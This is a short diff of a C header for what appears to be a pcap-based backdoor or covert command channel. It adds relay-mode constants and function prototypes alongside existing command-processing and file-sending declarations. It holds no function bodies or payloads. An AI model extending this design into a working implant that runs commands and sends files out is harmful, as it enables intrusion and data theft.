@@ -30,6 +30,7 @@
 #define CMD_OUTPUT_SIZE         30000
 #define FROM_SERVER		1
 #define FROM_CLIENT		0
+#define FROM_RELAY              2
 
 #define RESPONSE_MODE           0
 #define TRANSFER_MODE           1
@@ -98,9 +99,12 @@ struct filelist {
 	struct filelist * next;
 };
 
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol);
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, 
+                       char * listen_host, int listen_port, char * dest_host, int dest_port, int protocol);
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
+void pkt_callback_relay(u_char *ptr_null, const struct pcap_pkthdr * pkt_header, const u_char* packet);
+int relayPacket(char * payload, int size_payload, const char * src_ip, const char * dest_ip, const int dest_port, int protocol);
 int parse_cmd(char * command, char * data, int size);
 int process_command(char * command, const struct ip_struct * ip, const int dest_port, int protocol);
 int send_file_data(const char* folder, const char * fileName, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
